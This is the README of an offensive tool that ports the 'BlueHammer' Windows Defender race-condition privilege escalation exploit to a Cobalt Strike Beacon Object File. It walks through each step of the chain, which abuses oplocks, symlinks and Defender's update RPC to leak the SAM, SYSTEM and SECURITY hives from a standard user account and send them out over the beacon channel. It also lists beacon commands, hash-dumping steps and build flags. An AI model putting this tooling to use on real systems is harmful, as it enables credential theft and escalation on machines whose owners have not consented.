# BlueHammer BOF

Cobalt Strike BOF port of the [BlueHammer](https://github.com/) Windows Defender TOCTOU privilege escalation exploit, originally by Tom Gallagher, Igor Tsyganskiy, and Jeremy Tinder.

Leaks protected files (SAM, SYSTEM, SECURITY registry hives) from a standard user context by exploiting race conditions in Windows Defender's signature update mechanism. No admin privileges required.

## How It Works

The exploit chains six primitives that individually appear benign but together bypass file access controls:

1. **Update Download** — Downloads legitimate Defender signature updates from Microsoft's CDN (`mpam-fe.exe`), extracts `.vdm` definition files from the embedded cabinet
2. **EICAR + Oplock Trigger** — Drops an EICAR test file to trigger Defender scanning, places a batch oplock on `RstrtMgr.dll` to intercept Defender's remediation flow, which creates a Volume Shadow Copy (VSS)
3. **Cloud Files Freeze** — Registers a Cloud Files sync root and uses the placeholder callback to identify Defender's PID, then freezes it with a second oplock — keeping the VSS alive
4. **RPC Update Trigger** — Calls Defender's `ServerMpUpdateEngineSignature` RPC method (Proc42) to make Defender process the staged `.vdm` files from a controlled directory
5. **Junction + Symlink Race** — While Defender holds the oplock, renames the update directory and replaces it with an NTFS junction pointing to `\BaseNamedObjects\Restricted`, then creates object manager symlinks redirecting `.vdm` filenames to the VSS copies of SAM/SYSTEM/SECURITY
6. **File Exfiltration** — Defender follows the junction/symlink chain and copies the protected files into its Definition Updates directory, where the BOF reads them and sends them back via the beacon download channel

## BOFs

| BOF | Command | Purpose |
|-----|---------|---------|
| `bh_leak` | `bh_leak [/dump:TARGET]` | Main exploit — leaks protected files |
| `bh_hashdump` | `bh_hashdump /sam:PATH` | Extracts NTLM hashes from a leaked SAM hive |

## Usage

### Leak Registry Hives

```
# Leak all three hives (default)
beacon> bh_leak

# Leak all three explicitly
beacon> bh_leak /dump:all

# Leak only SAM
beacon> bh_leak /dump:sam

# Leak only SYSTEM
beacon> bh_leak /dump:system

# Leak only SECURITY
beacon> bh_leak /dump:security
```

Leaked files are sent back via Cobalt Strike's beacon download channel as `SAM.bin`, `SYSTEM.bin`, and `SECURITY.bin`.

### Extract Hashes (On-Target)

If you need hashes immediately on-target (requires `offreg.dll` uploaded to the box):

```
beacon> bh_hashdump /sam:C:\Users\Public\SAM.bin
beacon> bh_hashdump /sam:C:\temp\SAM.bin /offreg:C:\temp\offreg.dll
```

### Extract Hashes (Offline — Recommended)

Download the leaked SAM + SYSTEM files and use `secretsdump.py` locally:

```bash
secretsdump.py -sam SAM.bin -system SYSTEM.bin LOCAL
```

## Requirements

- **Windows 10/11** with Windows Defender enabled and running
- **x64 beacon** (x86 not supported — the exploit uses x64-specific structures)
- **Internet access** from the target (downloads `mpam-fe.exe` from `go.microsoft.com`)
- **Standard user privileges** — no admin/SYSTEM required for the leak stage
- **Pending signature update** is downloaded directly (force mode, no Windows Update API polling)

For `bh_hashdump` only:
- `offreg.dll` (Microsoft Offline Registry Library) must be present on the target
- SYSTEM or admin access for reading the LSA boot key from the live registry

## Building

Requires Visual Studio with the C++ build tools. Open a **Developer Command Prompt** and run:

```
cd bluehammer
build.bat
```

Output:
```
bin\bh_leak.x64.o       — Main exploit BOF
bin\bh_hashdump.x64.o   — SAM hash extraction BOF
```

### Compiler Flags

| Flag | Purpose |
|------|---------|
| `/c` | Compile only (no linking — BOFs are object files) |
| `/GS-` | Disable buffer security checks (no `__security_cookie`) |
| `/Gs999999999` | Disable stack probes (no `__chkstk`) |
| `/GF-` | Disable string pooling (no `??_C@` symbols) |
| `/Gy-` | Disable function-level linking |
| `/O1` | Optimize for size |

## Project Structure

```
bluehammer/
├── include/
│   ├── bh_dfr.h           DFR declarations for all Windows APIs
│   └── bh_rpc.h           Minimal RPC stub (54-byte NDR format string)
├── bh_leak.c              Main exploit BOF
├── bh_hashdump.c          SAM hash extraction BOF
├── bluehammer.cna         Aggressor script
├── build.bat              MSVC build script
└── bin/                   Compiled output (gitignored)
```

## Design Notes

### RPC Stub Minimization

The original BlueHammer includes 73,000 lines of MIDL-generated RPC stubs (`windefend_c.c`). For the BOF, only the 54-byte NDR procedure format string for `Proc42_ServerMpUpdateEngineSignature` is included, with the MIDL proxy/stub structures initialized at runtime in `bh_rpc.h`. This keeps the BOF compact while using the standard `NdrClientCall3` marshaling path.

### C++ to C Conversion

| Original (C++) | BOF (C) |
|---|---|
| `std::vector` / `std::wstring` | Fixed-size `wchar_t[]` arrays |
| `throw` / `try` / `catch` | `goto cleanup` pattern |
| COM-based update polling | Removed — always downloads directly |
| Shell spawning / service creation | Removed — you already have a beacon |
| `printf` / `cout` | `BeaconFormatPrintf` with buffered output |
| Direct Win32 API calls | DFR pattern (`KERNEL32$CreateFileW`) |
| File output to disk | `BeaconDownload()` over beacon channel |
| `new` / `delete` | `malloc` / `free` via MSVCRT DFR |

### What Was Removed

- **Windows Update API polling** — The original waited for a pending Defender update via COM. The BOF downloads directly (equivalent to `--force` mode).
- **Credential hijacking / shell spawning** — The original changed user passwords, logged in, created services, and spawned shells. This is unnecessary with a beacon and was removed.
- **x86 support** — The exploit relies on x64 thread context manipulation (`ctx.Rip`) and 64-bit RPC structures.
- **Verbose/help/argument parsing** — Replaced with the `/param:value` BOF arg parser pattern.

## Credits

- Original exploit: Tom Gallagher, Igor Tsyganskiy, Jeremy Tinder
- BOF conversion: Generated with Cobalt Strike BOF template patterns
